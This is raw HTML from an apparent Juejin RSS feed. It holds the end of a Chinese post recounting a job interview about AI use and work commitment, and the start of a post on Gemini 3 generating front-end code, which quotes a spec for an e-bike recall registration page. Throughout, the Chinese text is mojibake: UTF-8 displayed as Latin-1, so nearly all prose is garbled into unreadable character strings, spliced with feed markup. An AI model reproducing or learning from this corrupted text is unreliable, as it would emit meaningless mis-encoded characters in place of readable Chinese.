<p>å› ä¸ºæˆ‘æ˜¯åœ¨ 2014 å¹´è€ƒå…¥æ¹–åŒ—å·¥ä¸šå¤§å­¦ï¼Œåœ¨ 2015 å¹´å› å®¶åº­å›°éš¾é€€å­¦å‡ºæ¥æ‰“å·¥ï¼Œå½“é”€å”®åœ¨ä¸­å›½ç”µä¿¡å–æ‰‹æœºï¼Œå·¥ä½œäº†ä¸¤å¹´æ”’é’±å»åŸ¹è®­ç­å­¦äº† Javaï¼Œä»æ­¤èµ°ä¸Šç¼–ç¨‹é“è·¯ã€‚</p>
<p>è¿™é‡Œæˆ‘è¯´çš„ç¡®æœ‰ä¸€äº›å½±å“ï¼Œä½†æ˜¯ä¸­å›½çš„å¸‚åœºè¶³å¤Ÿå¤§ï¼Œæ‰€ä»¥æˆ‘æŠŠæ•´ä¸ªå¸‚åœºå½“åšæœç´¢ï¼Œè€Œä¸æ˜¯é€‚é…ï¼Œå±•ç¤ºæœ€çœŸå®çš„è‡ªå·±ï¼Œå¯»æ‰¾ä¸æˆ‘æœ€åŒ¹é…çš„å²—ä½ï¼Œæœ€éœ€è¦æˆ‘çš„å…¬å¸ï¼›è€Œä¸æ˜¯ä¸ºäº†è¿åˆæŸå®¶å…¬å¸è¿å°±è‡ªå·±å»é€‚é…å…¬å¸ã€‚</p>
<p>æ‰€ä»¥è¿™ä»¶äº‹æœ¬èº«è™½ç„¶æœ‰ä¸€äº›å›°æ‰°ï¼Œä½†ä¹Ÿè¿˜å¥½ã€‚</p>
<h5 data-id="heading-12">ä½ åˆšåˆšè¯´äº†å¾ˆå¤š AI åœ¨ç ”å‘ä¸Šçš„ææ•ˆï¼Œåœ¨äº§å“æ–¹é¢æ€ä¹ˆææ•ˆï¼Ÿ</h5>
<p>è¿™ä¸ªå¥½åƒæ˜¯äºŒé¢é—®çš„ï¼Œæˆ‘æœ‰ç‚¹è®°ä¸æ¸…äº†ã€‚</p>
<p>æˆ‘è¯´ AI èƒ½ææ•ˆçš„å‰ææ˜¯äººå·²ç»å…ˆæŠŠéœ€æ±‚ç†è§£çš„è¶³å¤Ÿé€å½»ï¼Œå¦‚æœä¸€ä¸ªä¸œè¥¿äººéƒ½ä¸äº†è§£ï¼Œäº¤ç»™ AI å»åšä¸€å®šåšä¸å¥½ã€‚</p>
<p>é’ˆå¯¹äº§å“ä¾§çš„ææ•ˆåˆ†ä¸ºä¸¤ä¸ªæ–¹é¢ï¼Œå®æ–½å’Œæ€è€ƒã€‚</p>
<p>å®æ–½æ–¹é¢åœ¨åŸå‹å›¾ã€æµç¨‹å›¾ç­‰å®ç°æ–¹é¢ AI è¦å¿«ï¼Œæ¯”å¦‚ figmaï¼Œæ€è€ƒæ–¹é¢å½“ç„¶åœ¨ç”»å›¾å‰äººè¦å…ˆäº†è§£çŠ¶æ€æœºã€ä¸šåŠ¡æ¶æ„ç­‰ç­‰ï¼Œè¿™é‡Œäººè¦æœ‰ä¸ªé‡è¦çš„ç‰¹è´¨æ˜¯çŸ¥é“è‡ªå·±ä¸çŸ¥é“ï¼ŒæŠŠä¸çŸ¥é“çš„éƒ¨åˆ†ç”¨ AI è¡¥å…¨ï¼Œåšå‡ºæ›´å®Œå–„çš„æµç¨‹å›¾å’Œæ¶æ„ã€‚</p>
<h5 data-id="heading-13">æ€ä¹ˆåˆ¤æ–­ä¸€ä¸ªäºº AI æ˜¯å¦çœŸçš„æœ‰ç»éªŒï¼Ÿ</h5>
<p>æˆ‘è¯´ä»æŠ€æœ¯å±‚é¢ï¼Œå¾—æœ‰ä¸ªä¼š AI çš„äººå’Œé¢è¯•è€…èŠï¼ŒçœŸæ­£çš„çŸ¥è¯†åœ¨ç»†èŠ‚é‡Œé¢ï¼Œå¦‚æœåˆ°äº†å¾ˆåº•å±‚ä¸¤è¾¹éƒ½èƒ½èŠä¸Šæ¥ï¼Œé‚£å°±è¯´æ˜é¢è¯•è€…æ˜¯çš„ç¡®æœ‰èƒ½åŠ›çš„ã€‚</p>
<p>ä»ä¸šåŠ¡å±‚é¢ï¼Œå¦‚æœ AI å¯ä»¥å¸®åŠ©é™æœ¬å¢æ•ˆï¼Œå°±è¯´æ˜æ˜¯æœ‰ç”¨çš„ã€‚</p>
<h5 data-id="heading-14">æ€ä¹ˆä¿è¯æŠŠä½ æ‹›è¿›æ¥åå¿ƒæ€åœ¨å·¥ä½œä¸Šï¼Ÿ</h5>
<p>æœ€å CEO å¾ˆå¦ç‡çš„è®²å‡ºäº†å¥¹çš„ç–‘æƒ‘ï¼Œå¥¹è¡¨ç¤ºçœ‹æˆ‘å¹³æ—¶æŠ˜è…¾çš„å¾ˆå¤šï¼Œæ€ä¹ˆä¿è¯æˆ‘æ‹›ä½ è¿›æ¥äº†åï¼Œä½ å¿ƒæ€åœ¨ä¸Šç­ä¸Šï¼Ÿ</p>
<p>è¿™ä¸ªé—®é¢˜çš„ç¡®å¦è¯šğŸ¤£ğŸ¤£ï¼Œä½†æ˜¯æˆ‘ä¹Ÿè¯´å‡ºäº†è‡ªå·±å†…å¿ƒçœŸå®çš„æƒ³æ³•ã€‚</p>
<p>æˆ‘å–œæ¬¢çº³ç“¦å°”æœ€æ–°ä¸€æ¬¡çš„é‡‡è®¿ï¼Œçº³ç“¦å°”è¯´äººç”Ÿæœ‰ä¸‰ä¸ªé‡å¤§å†³ç­–ä¸€å®šè¦ä»”ç»†æ€è€ƒï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯åšä»€ä¹ˆäº‹ã€‚æˆ‘ç°åœ¨å¯¹ä¸‹ä¸€ä»½å·¥ä½œæœ‰ 3 å¹´çš„è§„åˆ’ï¼Œæ‰€ä»¥æˆ‘ä¼šä»”ç»†çš„å®¡è§†ï¼Œä¸€æ—¦ç¡®å®šï¼Œæˆ‘å°†è¦æŠ•èº«äºæ­¤ã€‚</p>
<p>äººç”Ÿæ—©æœŸæ¢ç´¢é˜¶æ®µåšåŠ æ³•ï¼Œå¯¹ä»»ä½•æ–°é²œçš„äº‹ç‰©éƒ½è¯´ yesï¼Œéšç€å¯¹è‡ªèº«ç†è§£å’Œè§è¯†çš„å¢é•¿ï¼Œè¦å¼€å§‹å­¦ä¼šåšå‡æ³•ï¼Œå¯¹ä¸€åˆ‡å…¶ä»–äº‹ç‰©è¯´ NO,ä¸“æ³¨äºæ‰‹å¤´çš„äº‹æƒ…ã€‚</p>
<p>å¾ˆå¤šæ—¶å€™æå‰¯ä¸šçš„æœ¬è´¨è¿˜æ˜¯ä¸ºäº†èµšé’±ï¼Œå¦‚æœè¯´å·²ç»æœ‰äº†è¶³å¤Ÿçš„é‡‘é’±ï¼Œé‚£ä¼šåšä»€ä¹ˆå‘¢ï¼Ÿæ€è€ƒçš„è¶³å¤Ÿæ·±åˆ»åï¼Œæˆ‘çš„å›ç­”æ˜¯å’Œè¿™ä¸ªä¸–ç•Œåšäº’åŠ¨ï¼Œæˆ‘ä¸ºç¤¾ä¼šåˆ›é€ ä¸€äº›ä»·å€¼ï¼Œä¸–ç•Œç»™æˆ‘ä¸€äº›åé¦ˆã€‚å¦‚æœè¯´ç°åœ¨åšçš„äº‹å·²ç»æ˜¯è´¢åŠ¡è‡ªç”±åæƒ³åšçš„ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜è¦å»æå‰¯ä¸šï¼Ÿ</p>
<p>å¦ä¸€æ–¹é¢æˆ‘ç°åœ¨å¯¹ç‰©æ¬²æ²¡é‚£ä¹ˆå¤§çš„éœ€æ±‚ï¼Œç›¸æ¯”è¾ƒæ›´å¤šçš„é‡‘é’±ï¼Œæˆ‘å¸Œæœ›ä¸€ä¸ªäº‹åšæˆåï¼Œé‚£ç§æ»¡è¶³æ„Ÿã€æˆå°±æ„Ÿä¼šæ›´æŒä¹…ï¼Œæˆ‘ä¼šè¿½æ±‚é‚£äº›ã€‚</p>
<p>ç›¸æ¯”è¾ƒè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘çœŸæ­£æ€è€ƒçš„æ˜¯æˆ‘èƒ½ä¸èƒ½åœ¨è¿™ä¸ªè¡Œä¸šé•¿ä¹…çš„ä»¥ä¸€ç§å¹³é™ç”šè‡³æ„‰å¿«çš„æƒ…ç»ªåšä¸‹å»ï¼Œæˆ‘ä»¥å‰è®¤ä¸ºåªè¦å¯¹ä¸€ä»¶äº‹æœ‰å…´è¶£ï¼Œå°±å¯ä»¥æ— è§†å…¶ä»–ä»»ä½•ä¸œè¥¿åšä¸‹å»ï¼Œå®é™…ä¸Šä¸æ˜¯çš„ï¼Œç¯å¢ƒçš„å½±å“ã€å¤–ç•Œçš„åé¦ˆéƒ½æœ‰å¾ˆå¤§å½±å“ï¼Œä½†æ”¹å˜ç¯å¢ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ç§æ™ºæ…§ï¼Œæ¯”å¦‚åœ¨å®¶æ€»æ˜¯ç©å°±è®©è‡ªå·±å»å›¾ä¹¦é¦†å­¦ä¹ ã€‚</p>
<p>æ‰€ä»¥ä¸€æ—¦æˆ‘æ¥å—äº† offerï¼Œå³è¯´æ˜æˆ‘ä»¬ç›®æ ‡ä¸€è‡´ï¼Œæˆ‘ä¼šç«­å°½å…¨åŠ›æœç€ç›®æ ‡å‰è¿›ï¼Œå¦‚æœåœ¨è¿‡ç¨‹ä¸­å‘ç°ä¸å¯¹ï¼ŒåŠæ—¶æ²Ÿé€šè°ƒæ•´ï¼Œå¦‚æœæœ€åå®åœ¨å‘ç°æœ‰ç¼˜æ— ä»½ï¼Œé‚£å°±å¥½èšå¥½æ•£ï¼Œè¿™ç›¸æ¯”è¾ƒç¡¬æ’‘åˆ°æœ€åå¤§å®¶éƒ½å¾ˆç—›è‹¦ï¼Œæ˜¯ä¸€ç§æ›´é«˜æ•ˆçš„æ–¹å¼ã€‚</p>
<p>å½“ç„¶è¿™ä¸ªå›ç­”æ˜¯æˆ‘æ•´ç†åçš„å›å¤ï¼Œæˆ‘ç°åœºçš„å›ç­”æ²¡è¿™ä¹ˆæœ‰é€»è¾‘ï¼Œä¸»è¦æ˜¯ä¸‰ä¸ªå°æ—¶å•Šï¼Œæˆ‘æœ‰ç‚¹é¡¶ä¸ä½äº†ï¼Œä¸Šä¸€æ¬¡è¿ç»­ä¸‰ä¸ªå°æ—¶è¿˜æ˜¯ç‹å®¶å¢©é‚£å®¶å…¬å¸ã€‚</p>
<p>æ€»çš„æ¥è¯´æˆ‘å¯¹è¿™å®¶å…¬å¸ç»™æˆ‘çš„ä½“æ„Ÿæ˜¯ä¸€å®¶æœ‰äººæƒ…å‘³çš„å…¬å¸ï¼Œæˆ‘çœ‹åˆ°æœ‰äººå¸¦å°å­©æ¥å…¬å¸ï¼ŒHR å’Œä»–ä»¬æœ‰è¯´æœ‰ç¬‘çš„ï¼Œé¢è¯•ç©ºéš™å’Œæˆ‘çœ‹äº†æ•´ä½“çš„å·¥ä½ï¼Œæ²¡å‘ç°æ–—æ®´ï¼Œæ²¡çœ‹åˆ°äº§å“ä¸ç ”å‘æ’•é€¼ï¼Œé¢è¯•å®˜ä»¬æ•´ç†ä¹Ÿæ˜¯å’Œè”¼å¹³ç­‰å°Šé‡çš„æ€åº¦ï¼Œæ²¡æœ‰å±…é«˜ä¸´ä¸‹å®¡åˆ¤çš„æ„Ÿè§‰ã€‚å¤§å®¶å›´ç»•ç€åˆ›é€ ä»·å€¼ï¼Œæœ‰æ¡ä¸ç´Šçš„è¿›è¡Œç€å·¥ä½œã€‚æˆ‘æ²¡å»è¿™å®¶å…¬å¸å·¥ä½œè¿‡ï¼Œæ­¤è§‚ç‚¹ä»…ä¾›å‚è€ƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å½“ Gemini 3 èƒ½å†™å‡ºå®Œç¾ CSS æ—¶ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆå‰©ä¸‹çš„æ ¸å¿ƒç«äº‰åŠ›æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7588837042014060570</link>    <guid>https://juejin.cn/post/7588837042014060570</guid>    <pubDate>2025-12-29T07:42:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588837042014060570" data-draft-id="7588711557500715058" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å½“ Gemini 3 èƒ½å†™å‡ºå®Œç¾ CSS æ—¶ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆå‰©ä¸‹çš„æ ¸å¿ƒç«äº‰åŠ›æ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-29T07:42:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å½“ Gemini 3 èƒ½å†™å‡ºå®Œç¾ CSS æ—¶ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆå‰©ä¸‹çš„æ ¸å¿ƒç«äº‰åŠ›æ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:42:41.000Z" title="Mon Dec 29 2025 07:42:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e61223f0e4442c480467f4c9d58f68a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598961&amp;x-signature=RYHNyjCzWiDMmV1dT0itPK4taA8%3D" alt="google-gemini-3-inc.webp" loading="lazy"/></p>
<h3 data-id="heading-0">å…„å¼Ÿä»¬ï¼Œå’±ä»¬çš„æŠ¤åŸæ²³è¶Šæ¥è¶Šçª„äº†ğŸ˜­</h3>
<p>Gemini 3 çš„å‘å¸ƒä¼šï¼Œå¤§å®¶çœ‹äº†æ²¡ï¼Ÿ</p>
<p>æˆ‘æ˜¯åœ¨è¢«çªé‡Œçœ‹å®Œçš„ã€‚çœ‹å®Œä¹‹åï¼Œæˆ‘ç›´æ¥å¤±çœ äº†ã€‚</p>
<p>ä»¥å‰æˆ‘è§‰å¾— AI å†™ä»£ç ä¹Ÿå°±é‚£æ ·ï¼Œå†™ä¸ª Todo List è¿˜è¡Œï¼ŒçœŸè¦ä¸Šä¸šåŠ¡é€»è¾‘ï¼Œå®ƒå°±å¾—å¹»è§‰ç»™ä½ çœ‹ğŸ˜’ã€‚</p>
<p>ä½† Google ç§€çš„è¿™ä¸€æ‰‹ï¼ŒçœŸçš„æœ‰ç‚¹<strong>ä¸è®²æ­¦å¾·</strong>ã€‚</p>
<p>æˆ‘å‡ºäºå¥½å¥‡å¿ƒï¼Œç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Faistudio.google.com%2Fapps" target="_blank" title="https://aistudio.google.com/apps" ref="nofollow noopener noreferrer">Google Al Studio</a> è¯•äº†ä¸€ä¸‹å‡ ä¸ªç»å…¸çš„éœ€æ±‚, ç›´æ¥æŠŠé£ä¹¦éœ€æ±‚æ–‡æ¡£æ‰”ç»™å®ƒï¼ˆçº¯æ–‡æ¡ˆï¼‰ğŸ‘‡ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">Recall landing page
<span class="hljs-number">1</span>. é¡µè„šçš„recallsè·³è½¬æ–°çš„recall landing page
[å›¾ç‰‡]
<span class="hljs-number">2</span>. é¡µé¢å†…å®¹
æ ‡é¢˜ï¼šProduct Recalls

ä¸¤ä¸ªå†…å®¹æ¨¡å—ï¼Œç‚¹å‡»åè·³è½¬è‡³å„è‡ªè¯¦æƒ…é¡µ
ç¬¬ä¸€ä¸ªï¼š
<span class="hljs-number">2025</span> Fat Tire Trike Recall Notice
Pedego has issued a safety recall <span class="hljs-keyword">for</span> Fat Tire Trikes due <span class="hljs-keyword">to</span> a potential frame fracture near a weld that may pose fall <span class="hljs-built_in">or</span> injury risks. Affected owners are eligible <span class="hljs-keyword">for</span> a free repair, completed <span class="hljs-keyword">by</span> a local Pedego dealer.
Learn more ï¼ˆå¯ç‚¹å‡»ï¼Œè·³è½¬è‡³Fat Tire Trike Recall Pageï¼‰

ç¬¬äºŒä¸ªï¼š
<span class="hljs-number">2021</span> Cable Recall Notice
Pedego <span class="hljs-built_in">is</span> voluntarily recalling <span class="hljs-keyword">select</span> e-bike models sold <span class="hljs-keyword">from</span> January <span class="hljs-number">2018</span> <span class="hljs-keyword">to</span> August <span class="hljs-number">2020</span> due <span class="hljs-keyword">to</span> a cable issue that may cause unexpected acceleration. Affected owners should <span class="hljs-keyword">stop</span> riding <span class="hljs-built_in">and</span> register <span class="hljs-keyword">for</span> a free safety repair.
Learn moreï¼ˆå¯ç‚¹å‡»ï¼Œè·³è½¬è‡³https://www.pedegobikerecall.expertinquiry.com/?_gl=<span class="hljs-number">1</span>*<span class="hljs-number">1</span>hzkwd0*_gcl_au*MTkxNDc4ODEuMTc2MzM0NDUyMA..*_ga*MTM1MzU3NTAzOC4xNzQ1OTE1NTcz*_ga_4K15HG6FFG*czE3NjQ4MzQ5MDAkbzQyJGcwJHQxNzY0ODM0OTAxJGo1OSRsMCRoMA..*_ga_FGPZTS4D91*czE3NjQ4MzQ5MDAkbzQyJGcwJHQxNzY0ODM0OTAxJGo1OSRsMCRoMA..ï¼‰
[å›¾ç‰‡]



Fat Tire Trike Recall Page
æ ‡é¢˜ï¼šPedego Recalls Fat Tire Trike Due <span class="hljs-keyword">to</span> Fall <span class="hljs-built_in">and</span> Laceration Hazards
[æ’å…¥å‡ å¼ Fat Tire Trikeå›¾ç‰‡]
 
é¡µé¢ä¸»ä½“å†…å®¹
Name <span class="hljs-keyword">of</span> Product: Pedego Fat Tire Trike
<span class="hljs-symbol">Hazard:</span> The trike frame can develop a hairline fracture near a weld, which can cause the tube <span class="hljs-keyword">to</span> break, posing fall <span class="hljs-built_in">and</span> laceration hazards. 
Units Affected: Serial Number Range: D2312050001 - D2312050522 
 
æŒ‰é’®ï¼šREGISTER NOW ï¼ˆç‚¹å‡»åè·³è½¬è‡³é¡µé¢ä¸‹æ–¹æ³¨å†Œè¡¨å•ï¼‰
  
How <span class="hljs-built_in">is</span> Pedego making this right? 
Pedego <span class="hljs-built_in">is</span> offering you a free repair <span class="hljs-keyword">of</span> your Fat Tire Trike. We have reengineered <span class="hljs-built_in">and</span> strengthened the section <span class="hljs-keyword">of</span> the frame <span class="hljs-keyword">in</span> question. Once you register, we will ship a repair part <span class="hljs-keyword">to</span> a local Pedego dealer that you <span class="hljs-keyword">select</span> <span class="hljs-keyword">using</span> the registration form. 
We will ship the part <span class="hljs-keyword">to</span> the dealer. The Pedego dealer will repair the Fat Tire Trike free <span class="hljs-keyword">of</span> charge. There are no charges <span class="hljs-built_in">or</span> fees associated <span class="hljs-keyword">with</span> this recall. 
You will be contacted <span class="hljs-keyword">when</span> your part <span class="hljs-built_in">is</span> received at the Pedego store <span class="hljs-keyword">for</span> installation.

Make sure that other members <span class="hljs-keyword">of</span> your household also know about the recall <span class="hljs-built_in">and</span> immediately <span class="hljs-keyword">stop</span> <span class="hljs-keyword">using</span> it. Secure your Fat Tire Trike so that it cannot be ridden <span class="hljs-keyword">until</span> it <span class="hljs-built_in">is</span> repaired.
We strongly encourage you <span class="hljs-keyword">to</span> participate <span class="hljs-built_in">and</span> contact us <span class="hljs-keyword">to</span> obtain a free repair.
 
Register <span class="hljs-keyword">for</span> the free repair <span class="hljs-keyword">of</span> your Fat Tire Trike
First Name*
Last Name*
Email*
Phone number*
Dealer <span class="hljs-keyword">Where</span> youâ€™d <span class="hljs-built_in">like</span> the repair <span class="hljs-keyword">to</span> <span class="hljs-keyword">take</span> place *  [Perhaps Preload options <span class="hljs-built_in">or</span> provide location search <span class="hljs-keyword">for</span> dealerï¼ˆè¿™é‡Œæœ‰æ²¡æœ‰å¯èƒ½æä¾›é€‰é¡¹è®©æ¶ˆè´¹è€…é€‰æ‹©ï¼Ÿæˆ–è€…æœç´¢åœ°å€ï¼Ÿï¼‰]
State* 
Zip Code*
Country*
 
[] * I hereby affirm that the information I have provided <span class="hljs-built_in">is</span> accurate <span class="hljs-built_in">and</span> correct, <span class="hljs-built_in">and</span> that I have complied <span class="hljs-keyword">with</span> all requirements <span class="hljs-keyword">of</span> the above-referenced recall <span class="hljs-keyword">for</span> seeking a repair <span class="hljs-keyword">of</span> my Fat Tire Trike.
 
 Submit(æäº¤æŒ‰é’®)

æˆåŠŸæäº¤åæ˜¾ç¤ºï¼š
Thank you. Your registration has been submitted <span class="hljs-built_in">and</span> <span class="hljs-built_in">is</span> being processed. 
We will notify you <span class="hljs-keyword">when</span> the parts ship <span class="hljs-keyword">to</span> the dealer. The dealer will install <span class="hljs-built_in">and</span> repair your Fat Tire Trike free <span class="hljs-keyword">of</span> charge. 

[æ‰€æäº¤ä¿¡æ¯åœ¨è¿™é‡Œå±•ç¤º]
 
Please print this page <span class="hljs-keyword">for</span> your records. 
</code></pre>
<p><strong>æˆ‘åˆšå‡†å¤‡ç‚¹æ ¹çƒŸçš„å·¥å¤«ï¼Œé¡µé¢ UI å°±å‡ºæ¥äº†ğŸ‘‡ã€‚</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f8303d6113b4392b2b30fa14be1b8a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598961&amp;x-signature=kx7xtj8wat67uTgf0xxigsh5WW4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7eb998cebc14a4f933c753241eaedc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598961&amp;x-signature=xU6mjgChbI950RA%2BHZLL97x%2FkZo%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸æ˜¯é‚£ç§æ»¡å± <code>div</code> çš„åƒåœ¾ä»£ç ï¼Œæ˜¯è¯­ä¹‰åŒ–æå¥½ã€ç»„ä»¶æ‹†åˆ†åˆç†ã€ç”šè‡³è¿ <code>dark mode</code> éƒ½ç»™é…å¥½äº†çš„æˆå“ï¼Œæ ¹æœ¬ä¸éœ€è¦æ”¹ä»€ä¹ˆğŸ˜–ã€‚</p>
<p>æˆ‘çœ‹ç€å±å¹•ä¸Šè‡ªå·±åˆšå†™äº†ä¸€åŠã€è¿˜åœ¨çº ç»“ <code>flex-basis</code> è¯¥ç»™å¤šå°‘çš„æ ·å¼æ–‡ä»¶ï¼Œçªç„¶è§‰å¾—ï¼š<strong>è¿™å‡ å¹´çš„ä»£ç ï¼Œå¥½åƒç™½å†™äº†ã€‚</strong></p>
